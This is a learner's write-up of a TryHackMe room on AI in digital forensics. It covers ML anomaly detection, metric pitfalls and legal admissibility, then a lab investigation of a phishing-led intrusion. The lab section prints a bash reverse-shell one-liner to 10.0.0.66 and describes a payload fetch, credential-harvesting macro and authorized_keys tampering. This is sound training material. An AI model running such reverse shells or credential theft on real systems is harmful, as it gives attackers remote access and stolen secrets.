# [AI Forensics](https://tryhackme.com/room/aiforensics) - TryHackMe

**Path:** AI Fundamentals, Room 5

**Focus:** How AI and machine learning help digital forensics and incident response (DFIR), where they fall short, the legal and ethical issues they raise, and a hands-on investigation where ML scripts guide a human analyst

## Overview

This room asks whether digital forensics actually needs AI, and answers it from both sides. The first half covers what AI is good at in DFIR (processing huge volumes of data, spotting anomalies, scaling across modern infrastructure), what it is bad at (it is probabilistic, its metrics can mislead, and it depends on its input data), and the legal and ethical problems that follow. The second half is a practical case, "The Digital Trail", where two scikit-learn scripts flag suspicious logs and files and the human analyst has to validate each finding and reconstruct the attack. The message the room repeats, and the one the practical proves, is that AI is a guide and not a replacement for the analyst.

## Task 2: The AI forensics landscape

Three strengths of AI map directly onto DFIR work. The first is **data processing**: transformer models can process whole bodies of text in parallel, so classifying or summarising a large evidence set takes far less manual effort. The second is **anomaly detection**: models learn what normal looks like for users, systems and networks, so the needle in the haystack stands out, including patterns a human would not think to look for. The third is **scalability**: cloud, hybrid and remote endpoints generate more forensic data than ever, and AI can keep processing it without a matching increase in headcount.

The room lists where this is already in use:

| DFIR task | What AI enables | Example tools |
|---|---|---|
| Anomaly detection / UEBA | Flags behaviour that deviates from a learned baseline, using unsupervised methods such as Isolation Forests and Autoencoders | Splunk UEBA, Elastic ML, Exabeam |
| Phishing and communication | Transformer models (BERT, RoBERTa) classify messages by tone, structure and known attack patterns | Microsoft Defender for O365, Splunk NLP |
| Malware and file classification | Classifies files as malicious or benign from static and dynamic features | Microsoft Defender (STAMINA), Cylance, VirusTotal ML |
| Alert triage and prioritisation | Scores and ranks alerts from past data and analyst feedback | Cortex XSOAR/XSIAM, IBM QRadar Advisor, CrowdStrike Falcon with Charlotte AI |
| Timeline and event correlation | Clusters and links logs across sources to rebuild attack chains | Timesketch, Velociraptor, Jupyter-based analysis |

The room illustrates anomaly detection with Elastic's Anomaly Explorer, where a single client IP scored 99 for requesting 88 distinct URLs against a typical value of 1, a clear case of scanning that no fixed rule had to be written for.

*(Screenshot: Elastic Anomaly Explorer from the room)*

### Limitations

**Probabilistic, not deterministic.** Traditional software gives the same output for the same input, while AI models give outputs with probabilities, which is why the same query rarely returns the same answer twice. That is useful for handling uncertainty, but DFIR needs consistent, repeatable results. In practice it means the same evidence could produce different reconstructed timelines, and small changes to a prompt can change the output a lot, so extensive prompt engineering is needed when AI is used for evaluation.

**One metric is never enough.** Accuracy is the overall rate of correct predictions, but forensic data is heavily imbalanced, so a model that calls every file benign scores 99% accuracy on 100 files where only one is malicious, while being useless. Precision asks how many of the files flagged as malicious really are, so high precision means fewer false positives, but a very selective model can miss real threats. Recall asks how many of the real threats were found (finding 18 of 20 is 90%), but a model that flags everything gets 100% recall and drowns the analyst in false positives. The metrics only mean something when read together.

**Garbage in, garbage out.** A model trained on poor or unrepresentative data will state false conclusions with confidence, which is a serious problem when the output feeds an investigation.

## Task 3: AI across four areas of DFIR

### Image and video forensics

Convolutional neural networks (CNNs) learn patterns in data using small filters and are the standard tool for images and video. The room describes three applications. In forgery detection, Error Level Analysis (ELA), a technique that highlights compression inconsistencies where an image may have been altered, is combined with a CNN that classifies regions as forged or not, and the room cites a 2024 study reporting 94% accuracy. In deepfake detection, CNN-based detectors look for subtle inconsistencies in facial video. Generative adversarial networks (GANs), where one network generates fakes and another tries to detect them, drive both better fakes and better detectors, which makes this an arms race powered by AI on both sides.

### How AI-generated media is identified and proven

The basic idea is that there is no single test, and the work is done by several methods that support each other. NIST's report on synthetic content (NIST AI 100-4) groups the technical approaches into three families:

1. **Provenance and metadata:** recording where content came from and how it was changed. The main open standard is C2PA Content Credentials, where a capture device or editing tool attaches a digitally signed manifest to the file. Checking it shows whether the file has been altered since signing and who signed it, but the standard itself does not judge whether the content is true, only whether the provenance data is valid.
2. **Watermarking:** embedding a signal into AI-generated content when it is created, so it can be detected later.
3. **Detection:** analysing the content itself, with automated classifiers (such as the ELA plus CNN approach above) or with human-assisted review.

None of these gives certainty on its own. NIST notes that the effectiveness of many of these approaches is not yet fully examined, and that transparency can contribute to trust without guaranteeing it. Detectors are probabilistic and have to keep up with new generators, provenance only helps if it was recorded at the start and survives sharing, and a real piece of content can still be misrepresented by taking it out of context. Sources also differ on a related point: NIST says that if provenance data becomes widespread, its absence where it would be expected could itself raise suspicion, while a secondary glossary I checked says nearly all media today carries none, so absence means little at the moment.

For an examiner, that means a finding that something is fake or authentic should rest on several things together: any provenance data, expert analysis of the file, and corroborating evidence about where the original came from. It also has to survive the legal tests in Task 4, which is why explainability and documentation matter as much as the detector's score.

### Communication analysis

Transformer-based NLP models such as BERT and RoBERTa can classify phishing emails against legitimate ones, and the room cites a study reporting 99% accuracy. This lets defenders move from rule-based filtering on known bad URLs and keywords to context-aware models, and to triage emails for human review. The same technology lets forensic platforms scan chat logs and social media for threat-related language and run sentiment analysis, finding communications in datasets far too large to read by hand.

### Timeline reconstruction and user behaviour

ML can ingest logs, filesystem timestamps and network records and merge them into one chronological timeline, which is especially valuable when an attacker has tampered with logs. Anomaly detection adds behavioural flags such as impossible logins (one user in two places at once) or activity unusual for that specific user, and the same approach can model normal behaviour for a web application so a web application firewall can act on deviations.

### Malware detection and analysis

ML has been applied to representing malware files in forms that deep neural networks can classify, as in the Microsoft and Intel STAMINA project. It is also used in dynamic analysis, for example by converting a program's API call sequence into an image and classifying it, and some form of ML is now standard in antivirus and EDR products.

## Task 4: Legal and ethical implications

Courts and regulators are still working out how AI-generated evidence fits existing standards, and the room covers four issues.

**Explainability and transparency.** Many models are black boxes, which clashes with the forensic need for defensible, explainable findings. The room describes a civil case where an LLM flagged emails as suspicious, the legal team could not explain why when challenged, and the evidence was excluded. It links this to the U.S. Daubert standard for the admissibility of expert testimony, which is why AI output needs expert validation to survive a courtroom challenge.

**Bias and fairness.** Models trained on skewed historical data reproduce the skew. In forensics that could mean de-prioritising non-English communications in a multilingual dataset, and the room points to facial recognition, which studies have found misidentifies Black and other minority people at higher rates, with documented wrongful arrests. A defence that shows a technique is biased may get its results excluded, and forensic experts have a duty to validate tools and correct for bias.

**Accountability and chain of custody.** Courts expect evidence handling to be traceable and its integrity preserved at every step. The room describes a case where an LLM summarised a suspect's phone data and the intermediate outputs were not logged, so the defence challenged the findings on procedural grounds. AI steps need to be documented and secured, and controlled or on-premises systems make this easier.

**Privacy and data protection.** Sending evidence to public cloud AI services can expose sensitive data to third parties and breach privacy law or court orders, and rules such as GDPR limit how personal data can be processed even in investigations. The room suggests secure offline environments or privacy-preserving approaches such as federated learning, and notes that evidence obtained without proper authority risks being ruled inadmissible.

## Task 5: Practical, The Digital Trail

**Scenario.** RobbCo, a software and firmware company, had a SOC alert about an off-hours login and other suspicious behaviour. The founder feared the proprietary code for RETROS BIOS, the MF Boot Agent bootloader and the Unified Operating System had been accessed. The job was to follow the trail with ML scripts as guides and human validation as the check.

**Setup.** I started the lab machine and used the terminal in the split screen. The room has you work inside a Python virtual environment, which keeps tools and changes away from the original evidence.

```
source /opt/dfir-env/bin/activate
```

### Step 1: Classify the authentication log

```
python3 /opt/dfir-lab/classify_logs.py /var/log/auth.log
```

The script, trained on labelled log data, flagged three lines:

```
[SUSPICIOUS] Jan 15 03:00:01 tryhackme sshd[1833]: Failed password for invalid user admin from 192.168.0.100 port 22 ssh2
[SUSPICIOUS] Jan 15 03:01:02 tryhackme sshd[1833]: Accepted password for j.morgan from 192.168.0.100 port 22 ssh2
[SUSPICIOUS] Jan 15 03:15:00 tryhackme sshd[1833]: Accepted publickey for r.house from 192.168.0.100 port 22 ssh2
```

Read together, these show a failed attempt on a nonexistent `admin` account, then a successful password login as `j.morgan` a minute later, then a public key login as `r.house` fourteen minutes after that, all from the same address and all at 3 AM. The move from a failed guess to a success suggests the attacker had obtained credentials from somewhere, and the switch from password to public key for `r.house` is a clue worth following, because it means a key had to be in place on that account first. The answer to when the attacker logged in as `j.morgan` is **03:01:02**.

![Output of classify_logs.py and file_anomalies.py](images/01-classify-logs-and-file-anomalies.png)

The screenshot above also contains the output of the file scan in the next step.

### Step 2: Flag anomalous files

```
python3 /opt/dfir-lab/file_anomalies.py
```

This script scans a fixed set of directories (`/opt/robbco`, `/tmp`, `/dev/shm` and `/usr/local/bin`) with a supervised model that scores files on features such as name, path, size, extension, entropy, permissions and creation time. It flagged nine files:

| Path | Size | Entropy |
|---|---|---|
| `/opt/robbco/sys/boot_monitor.log` | 59 | 4.54 |
| `/opt/robbco/engineering/MFBootAgent/mfboot_main.c` | 97 | 5.12 |
| `/opt/robbco/firmware/RETROS_BIOS/core.asm` | 54 | 4.36 |
| `/tmp/dock-replace.log` | 235 | 4.83 |
| `/tmp/.syncd` | 87 | 4.49 |
| `/tmp/.x` | 52 | 4.41 |
| `/tmp/invoice_dump.txt` | 709 | 4.65 |
| `/dev/shm/.core_dump_2025.tgz.enc` | 369 | 5.77 |
| `/usr/local/bin/sysmon` | 52 | 4.41 |

Two details in this output are worth noting. First, `/tmp/.x` and `/usr/local/bin/sysmon` have identical size and entropy, which is what you would expect from two copies of the same one-liner with only a small change, and that matches what I found later (the same reverse shell with different ports). Second, the scan scope does not include `/home`, which is where the initial access artefact turned out to live, so the script could not have flagged it directly. The room's own walkthrough does not explain `/tmp/dock-replace.log`.

### Step 3: Follow `invoice_dump.txt` to the initial access

`/tmp/invoice_dump.txt` is a data dump containing recon output, including bash history that references a file called `invoice_Q1_2075.ods` in `~/Documents/Invoices/`. The history does not say whose home directory it came from, but `auth.log` showed `j.morgan` as the first account accessed, so I checked there:

```
cd /home/j.morgan/Documents/Invoices
ls
invoice_Q1_2075.ods
```

![The invoice spreadsheet in j.morgan's Invoices folder](images/02-invoice-ods-location.png)

Per the room, this spreadsheet has an embedded macro that runs shell commands, harvests `.bash_history`, SSH keys and session data, dumps `/etc/passwd`, and tries to exfiltrate to `192.168.0.100`. That is the same address the SSH logins came from, which ties the stolen data to the login activity.

### Step 4: Find the phishing email

The mailbox was in the same home directory:

```
cd /home/j.morgan/Mail/inbox
cat email_invoice.eml
```

The email was sent from `akeane@poseidonenergy.net`, posing as the Director of Field Operations at Poseidon Energy, with the subject "URGENT - Outstanding Invoice Q1 2075", saying the invoice was overdue and had to be reviewed immediately, and attaching `invoice_Q1_2075.ods`. The urgency, the threat of escalation and the unexpected attachment are classic phishing markers. This confirms the initial access method as **phishing**.

![The phishing email in j.morgan's inbox](images/06-phishing-email.png)

### Step 5: Work out the privilege escalation

`j.morgan`'s shell history shows how the attacker reached the founder's account:

```
cat /home/j.morgan/.bash_history
cd ~/Documents/Invoices/
libreoffice invoice_Q1_2075.ods &
cd ~
ls -la
cat .ssh/config
cat /etc/motd
sudo nano /home/r.house/.ssh/authorized_keys
exit
```

![j.morgan's bash history](images/03-j-morgan-bash-history.png)

The key line is `sudo nano /home/r.house/.ssh/authorized_keys`. No exploit was needed: `j.morgan` was able to use `sudo` to edit another user's `authorized_keys`, so the attacker planted their own public key there and then logged in as `r.house` with it, which matches the 03:15:00 `Accepted publickey` entry. The history has no timestamps, so I cannot prove when the edit happened, but the log timing puts it between the `j.morgan` login at 03:01:02 and the `r.house` login at 03:15:00. This was abuse of legitimate permissions and not a technical vulnerability, which makes it harder for automated tools to spot. The history also mixes the victim's actions (opening the invoice) with the attacker's, and it cannot tell them apart on its own.

### Step 6: Tooling, persistence and disguise

Per the room, `/tmp/.syncd` fetches and runs a second-stage script from `http://10.0.0.66/payload.sh`, and `/tmp/.x` is a reverse shell stub to `10.0.0.66:4444`, giving the attacker live access in `j.morgan`'s context. After escalating to `r.house`, the attacker added persistence, and I inspected both artefacts myself.

```
cat /usr/local/bin/sysmon
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.66/5555 0>&1
```

`sysmon` is a reverse shell to `10.0.0.66:5555` disguised as a system monitoring tool. The deception is supported by a fake log:

```
cat /opt/robbco/sys/boot_monitor.log
Jan 15 03:22:10 bios_hook: UOS boot intercepted at 0x400f2
```

![The sysmon reverse shell and the fake boot_monitor.log](images/04-sysmon-and-boot-monitor-log.png)

This single line makes `sysmon` look like part of normal boot telemetry, and its timestamp (03:22:10) falls after the `r.house` login, which fits persistence being set up once the attacker had elevated access. The two reverse shells also show the attacker's thinking: `.x` runs as the unprivileged user and is temporary, while `sysmon` was placed after escalation for long-term access.

### Step 7: The theft, and the AI's false positives

The model also flagged two RobbCo source files, which I opened:

```
cat /opt/robbco/engineering/MFBootAgent/mfboot_main.c
// mfboot_main.c
void start_boot_sequence() { handshake("RETROS-52EE5"); load_os("UOS-2.3.0"); }

cat /opt/robbco/firmware/RETROS_BIOS/core.asm
; core.asm - RETROS BIOS Boot Script
INIT HW
BOOT UOS
```

![RobbCo's proprietary source files, flagged as suspicious by the model](images/05-proprietary-source-files.png)

These are the company's proprietary code, so they are not malicious. They are **false positives**, which is the lesson the room wants: the model flagged them as unusual but a human has to judge what unusual means. The real finding is `/dev/shm/.core_dump_2025.tgz.enc`, a base64-encoded archive staged in shared memory, which is a stealthy place to stage data. The room confirms it by decoding and unpacking it (`base64 -d` into a tar.gz, then `tar -xzvf`), which shows it holds RobbCo's source code, so the firmware, bootloader and operating system code were all stolen. The full path of the archive is **/dev/shm/.core_dump_2025.tgz.enc**.

### Reconstructed timeline

| When | Event | Evidence |
|---|---|---|
| Before the logins (time not shown) | Phishing email delivered to `j.morgan`, attachment opened, macro harvests data into `/tmp/invoice_dump.txt` | `email_invoice.eml`, `invoice_Q1_2075.ods`, `invoice_dump.txt` |
| Jan 15 03:00:01 | Failed login for invalid user `admin` from 192.168.0.100 | `auth.log` |
| Jan 15 03:01:02 | Successful password login as `j.morgan` | `auth.log` |
| Between 03:01 and 03:15 (inferred) | `sudo nano` edit of `r.house`'s `authorized_keys` | `j.morgan/.bash_history` |
| Jan 15 03:15:00 | Public key login as `r.house` | `auth.log` |
| Jan 15 03:22:10 | Fake boot log entry supporting the `sysmon` disguise | `boot_monitor.log` |
| Undated | Reverse shells (`.x` to port 4444, `sysmon` to port 5555), second-stage dropper `.syncd`, archive staged in `/dev/shm` | files above |

Two addresses stand out: `192.168.0.100` as the source of the logins and the macro's exfiltration target, and `10.0.0.66` as the host serving the payload and receiving both reverse shells. Both are private addresses, which in a real case would raise the question of a compromised internal host or pivot point and not only an external attacker.

### How the attack maps to MITRE ATT&CK

These steps correspond to ATT&CK Enterprise techniques including Phishing: Spearphishing Attachment, User Execution: Malicious File, Valid Accounts, Ingress Tool Transfer, Command and Scripting Interpreter: Unix Shell, Account Manipulation: SSH Authorized Keys, Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Masquerading, Obfuscated Files or Information (the base64 encoding), Archive Collected Data and Data Staged: Local Data Staging. The technique IDs should be looked up on attack.mitre.org before they go into a report.

### What the AI did, and what the human had to do

| The ML scripts | The analyst |
|---|---|
| Surfaced three suspicious log lines and nine suspicious files from thousands of entries | Decided what the flagged items meant and in what order they happened |
| Caught `sysmon` and the fake `boot_monitor.log`, which the room says could have taken hours to find | Followed `invoice_dump.txt` to the `.ods`, which was outside the files' scan scope, and found the phishing email |
| Flagged the proprietary source files | Recognised them as false positives |
| Gave no explanation for any flag | Reasoned out the privilege escalation from `.bash_history` and log timing |

The two scripts are supervised models trained on labelled data, which is a different approach from the unsupervised anomaly detection described in the landscape table, and both show the limit that matters most in DFIR: a model can only look where it was pointed and can only call something unusual, never explain why.

## How this applies to a SOC

For a Tier 1 analyst, the practical lesson is how to treat AI output. ML triage is valuable for narrowing thousands of events to a short list, as the scripts did, but every flag still has to be validated, because the model produced false positives and cannot see outside its scope. The investigation habits in this lab also carry over directly: build a timeline from log timestamps, follow one artefact to the next, tie addresses together across different evidence sources, and write down what is proven versus inferred. The legal points matter at any level too, since using AI on evidence means documenting each step, keeping an audit trail, and not sending sensitive data to an uncontrolled service.

## Key terms

Anomaly detection, UEBA, probabilistic vs deterministic, accuracy, precision, recall, GIGO, CNN, ELA, GAN, deepfake, provenance, C2PA Content Credentials, watermarking, explainability, Daubert, chain of custody, false positive, persistence, privilege escalation, reverse shell.

## Sources and verification notes

- Room content: TryHackMe, AI Forensics. The studies and cases it cites (the ELA plus CNN result, the phishing classification accuracy, the facial recognition wrongful arrests, and the civil case and phone data case behind the legal points) are written as the room states them, and I have not checked them against the original papers.
- NIST AI 100-4, Reducing Risks Posed by Synthetic Content (nist.gov, doi.org/10.6028/NIST.AI.100-4): **primary**, for the three approaches and the caveats on effectiveness. I read its wording through a community repost of the text, not the PDF directly.
- C2PA Technical Specification (spec.c2pa.org): **primary**, for how Content Credentials work and for the point that they do not judge whether content is true.
- The point that missing credentials mean little today comes from a **secondary** glossary, and it disagrees with NIST's comment on absence of provenance, so treat that detail as open.
- ATT&CK technique names are given without IDs, to be confirmed on attack.mitre.org.

## Takeaways

The room's message is that AI is a force multiplier for forensic work and not a substitute for it. The practical case showed this clearly: the scripts found the right places to look quickly, but the explanation, the timeline and the judgement about what was malicious and what was a false positive all came from the analyst. For me, the most useful points were that a model's scope limits what it can find, that explainability and documentation are what make AI-assisted findings usable in a legal setting, and that detecting AI-generated media depends on several methods working together and not on one tool.
